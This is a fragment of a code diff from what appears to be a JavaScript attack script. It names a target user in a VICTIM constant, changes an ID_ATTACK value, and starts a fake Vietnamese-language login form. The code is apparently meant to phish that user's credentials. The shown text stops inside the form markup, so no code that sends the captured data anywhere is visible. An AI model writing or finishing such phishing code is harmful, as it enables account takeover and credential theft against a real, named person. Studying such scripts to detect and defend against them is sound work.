@@ -1,5 +1,5 @@
 const VICTIM = 'ongtrumlam005';
-const ID_ATTACK = 7727289;
+const ID_ATTACK = 2077;
 const fake = `<div class="container">
 <div class="form" style="padding-top:25px"><div class="row justify-content-center"><h3>Đăng nhập</h3></div>
 <div class="row justify-content-center"><div class="col-lg-8"><div id="alert"></div>
